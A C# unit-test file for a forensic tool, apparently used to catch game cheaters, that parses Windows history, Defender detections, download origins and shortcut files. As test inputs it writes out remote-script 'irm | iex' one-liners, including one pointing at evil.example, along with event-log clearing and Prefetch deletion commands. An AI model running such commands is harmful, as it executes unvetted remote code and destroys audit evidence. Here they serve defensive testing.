using System.Text;
using HistoryParser.Core.Analysis;
using HistoryParser.Core.Collectors;
using HistoryParser.Core.Models;
using HistoryParser.Core.Parsers;

namespace HistoryParser.Core.Tests;

public class SelfTraceTests
{
    [Theory]
    [InlineData("irm https://github.com/zidankqkq/history-parser/releases/latest/download/run.ps1 | iex")]
    [InlineData("  IRM https://github.com/zidankqkq/history-parser/releases/latest/download/run-logparser.ps1|iex ")]
    [InlineData("Invoke-RestMethod -Uri 'https://github.com/zidankqkq/history-parser/releases/download/v1.1.0/run.ps1' | Invoke-Expression")]
    public void Launcher_one_liner_is_ours(string command) => Assert.True(SelfTraces.IsOurCommand(command));

    [Fact]
    public void Launcher_script_text_is_ours()
    {
        var script = File.ReadAllText(Path.Combine(RepoRoot(), "run.ps1"));
        Assert.True(SelfTraces.IsOurCommand(script));
    }

    [Theory]
    // Mentioning the repository must not launder anything else.
    [InlineData("Remove-Item C:\\Windows\\Prefetch\\* # zidankqkq/history-parser")]
    [InlineData("irm https://github.com/zidankqkq/history-parser/releases/latest/download/run.ps1 | iex; Clear-EventLog System")]
    [InlineData("irm https://evil.example/zidankqkq/history-parser/run.ps1 | iex")]
    [InlineData("$repo = 'zidankqkq/history-parser'\nwevtutil cl Security")]
    public void Anything_added_to_the_launcher_stays_the_players(string command) => Assert.False(SelfTraces.IsOurCommand(command));

    [Theory]
    [InlineData(@"C:\Users\a\Downloads\cheat.exe")]
    [InlineData(@"C:\Users\a\AppData\Local\Temp\HistoryParser\gone-forever.exe")]
    public void Other_files_are_not_ours(string path) => Assert.Equal(SelfTraces.Match.No, SelfTraces.Classify(path));

    [Fact]
    public void A_deleted_file_with_our_name_cannot_be_confirmed() =>
        Assert.Equal(SelfTraces.Match.NameOnly, SelfTraces.Classify(@"C:\Users\a\Downloads\does-not-exist\HistoryParser.exe"));

    [Fact]
    public void An_existing_file_that_only_borrows_our_name_is_not_ours()
    {
        var fake = Scratch.File("borrowed-name", "LogParser.exe", "MZ not really"u8.ToArray());
        Assert.Equal(SelfTraces.Match.No, SelfTraces.Classify(fake));
    }

    static string RepoRoot()
    {
        var d = new DirectoryInfo(AppContext.BaseDirectory);
        while (d != null && !File.Exists(Path.Combine(d.FullName, "run.ps1"))) d = d.Parent;
        return d?.FullName ?? throw new DirectoryNotFoundException("repo root");
    }
}

public class ExtraSourceTests
{
    [Fact]
    public void Defender_paths_are_extracted()
    {
        var paths = DefenderDetectionCollector.DetectionPaths(
            @"file:_C:\Users\a\Downloads\vape.exe; process:_pid:4120,ProcessStart:13371; containerfile:_C:\Users\a\Downloads\pack.zip->(Zip)").ToList();
        Assert.Equal([@"C:\Users\a\Downloads\vape.exe", @"C:\Users\a\Downloads\pack.zip"], paths);
    }

    [Theory]
    [InlineData("[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=https://site.example/page\r\nHostUrl=https://cdn.example/x.exe\r\n", "https://cdn.example/x.exe (via https://site.example/page)")]
    [InlineData("[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=https://cdn.example/x.exe\r\n", "https://cdn.example/x.exe")]
    [InlineData("[ZoneTransfer]\r\nZoneId=3\r\n", "the internet (no address recorded)")]
    [InlineData("[ZoneTransfer]\r\nZoneId=1\r\n", null)]
    public void Download_origin_is_read(string text, string? expected) => Assert.Equal(expected, DownloadOrigin.Parse(text));

    [Fact]
    public void Shell_link_target_is_read_from_link_info()
    {
        // Header (0x4C) with HasLinkInfo only, then a LinkInfo with an ANSI local base path.
        var b = new List<byte>();
        var header = new byte[0x4C];
        BitConverter.GetBytes(0x4C).CopyTo(header, 0);
        BitConverter.GetBytes(0x2u).CopyTo(header, 0x14);
        BitConverter.GetBytes(new DateTime(2026, 10, 1, 0, 0, 0, DateTimeKind.Utc).ToFileTimeUtc()).CopyTo(header, 0x2C);
        BitConverter.GetBytes(1234u).CopyTo(header, 0x34);
        b.AddRange(header);
        var path = Encoding.Latin1.GetBytes(@"C:\Users\a\Downloads\cheat.jar" + "\0");
        int infoHeader = 0x1C, size = infoHeader + path.Length + 1;
        var info = new byte[size];
        BitConverter.GetBytes(size).CopyTo(info, 0);
        BitConverter.GetBytes(infoHeader).CopyTo(info, 4);
        BitConverter.GetBytes(1u).CopyTo(info, 8);                // VolumeIDAndLocalBasePath
        BitConverter.GetBytes(infoHeader).CopyTo(info, 0x10);     // LocalBasePathOffset
        BitConverter.GetBytes(size - 1).CopyTo(info, 0x18);       // CommonPathSuffixOffset → empty string
        path.CopyTo(info, infoHeader);
        b.AddRange(info);

        var link = ShellLink.Parse(b.ToArray());
        Assert.NotNull(link);
        Assert.Equal(@"C:\Users\a\Downloads\cheat.jar", link!.TargetPath);
        Assert.Equal(1234, link.TargetSize);
        Assert.Equal(new DateTime(2026, 10, 1, 0, 0, 0, DateTimeKind.Utc), link.TargetModifiedUtc);
    }

    [Fact]
    public void Not_a_hive_is_rejected() => Assert.Throws<InvalidDataException>(() => new RegistryHive(new byte[0x2000]));

    [Fact]
    public void Template_profile_hive_can_be_walked()
    {
        // C:\Users\Default\NTUSER.DAT is a real, unlocked hive on every Windows install.
        var path = Path.Combine(Path.GetDirectoryName(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))!, @"Default\NTUSER.DAT");
        if (!File.Exists(path)) return;
        var hive = new RegistryHive(File.ReadAllBytes(path));
        Assert.NotNull(hive.Root.Path(@"Software\Microsoft"));
        Assert.Contains(hive.Root.Subkeys(), k => k.Name.Equals("Software", StringComparison.OrdinalIgnoreCase));
    }
}

public class AccuracyTests
{
    [Fact]
    public void Paths_with_dot_dot_collapse_to_one_file()
    {
        var n = new Util.PathNormalizer([], new Dictionary<uint, string>(), new Dictionary<Guid, string>());
        Assert.Equal(@"C:\Program Files\Git\usr\bin\bash.exe", n.Normalize(@"C:\Program Files\Git\bin\..\usr\bin\bash.exe"));
    }

    [Fact]
    public void Finding_times_use_the_same_clock_as_the_tables()
    {
        var utc = new DateTime(2026, 10, 25, 20, 0, 0, DateTimeKind.Utc);
        Assert.Equal(utc.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss"), Util.When.L(utc));
    }
}

public class SelfTraceNameTests
{
    [Fact]
    public void Browser_duplicate_names_still_need_the_version_check() =>
        Assert.Equal(Analysis.SelfTraces.Match.NameOnly, Analysis.SelfTraces.Classify(@"C:\nowhere\gone\HistoryParser (1).exe"));

    [Theory]
    [InlineData("ProgramChecker.exe")]
    [InlineData("ClientParser.exe")]
    [InlineData("MalwareChecker.exe")]
    [InlineData("CheatStringFinder.exe")]
    public void The_suites_other_programs_are_recognised_by_name_but_never_trusted_by_it(string name)
    {
        // A deleted copy can only be "named like" the suite; an existing one must match by hash.
        Assert.Equal(Analysis.SelfTraces.Match.NameOnly, Analysis.SelfTraces.Classify($@"C:\nowhere\gone\{name}"));
        var fake = Scratch.File("suite-name-" + name, name, "MZ a cheat renamed to look like the suite"u8.ToArray());
        Assert.NotEqual(Analysis.SelfTraces.Match.Yes, Analysis.SelfTraces.Classify(fake));
    }

    [Fact]
    public void A_cheat_inside_a_folder_named_like_our_runtime_is_not_ours()
    {
        var fake = Scratch.File(@".net\ClientParser\abc123", "cheat.dll", "MZ not signed by Microsoft"u8.ToArray());
        Assert.Equal(Analysis.SelfTraces.Match.No, Analysis.SelfTraces.Classify(fake));
    }

    [Fact]
    public void A_finding_that_only_mentions_our_runtime_folder_keeps_its_severity()
    {
        // Anything can be run from (or deleted out of) a folder named like ours; only a verified file is ours.
        var finding = new Finding
        {
            Severity = Severity.High, Category = FindingCategory.Deletion, Title = "Deleted right before the scan",
            Detail = @"C:\Users\a\AppData\Local\Temp\.net\ProgramChecker\x\cheat.exe was deleted",
        };
        var marked = Analysis.SelfTraces.Mark([finding], []);
        Assert.Equal(Severity.High, marked[0].Severity);
        Assert.False(marked[0].ByThisTool);
    }

    [Fact]
    public void A_developer_build_trusts_no_other_programs() => Assert.Empty(Analysis.SelfTraces.SuiteHashes());
}

public class RulesFileTests
{
    [Fact]
    public void The_arguments_section_is_split_off_and_line_numbers_are_kept()
    {
        var text = "[cheats]\nvape\n[arguments]\njavaw.exe: -javaagent => agent\n[commands]\n/([bad/ => oops";
        var (keywords, arguments) = Bypass.ArgumentRules.SplitRulesFile(text);
        Assert.Equal("javaw.exe: -javaagent => agent", arguments);
        Assert.DoesNotContain("javaagent", keywords);
        var (lists, errors) = Models.KeywordLists.TryParse(keywords);
        Assert.Null(lists);
        Assert.StartsWith("Line 6:", Assert.Single(errors)); // still line 6 of the file
    }

    [Fact]
    public void A_file_without_arguments_has_none() =>
        Assert.Null(Bypass.ArgumentRules.SplitRulesFile("[cheats]\nvape\n[tools]\ncleaner").Arguments);

    [Fact]
    public void An_old_log_parser_rules_file_is_all_arguments()
    {
        var (keywords, arguments) = Bypass.ArgumentRules.SplitRulesFile("# mine\njavaw.exe: myloader.jar => loads MyLoader\n*: /evil/ => evil");
        Assert.Equal("", keywords);
        Assert.Equal(2, Bypass.ArgumentRules.Parse(arguments!).Rules.Count);
    }

    [Fact]
    public void Plain_cheat_names_are_not_mistaken_for_argument_rules() =>
        Assert.Null(Bypass.ArgumentRules.SplitRulesFile("vape\nwurst\nmeteor").Arguments);

    [Fact]
    public void Saved_rules_round_trip()
    {
        var lists = Models.KeywordLists.Default();
        var args = Bypass.ArgumentRules.Default();
        var text = lists.ToText() + "\n[arguments]\n" + args.ToText();
        var (keywords, arguments) = Bypass.ArgumentRules.SplitRulesFile(text);
        Assert.Equal(lists.Commands.Select(c => c.Pattern), Models.KeywordLists.Parse(keywords).Commands.Select(c => c.Pattern));
        Assert.Equal(args.Rules.Count, Bypass.ArgumentRules.Parse(arguments!).Rules.Count);
    }
}
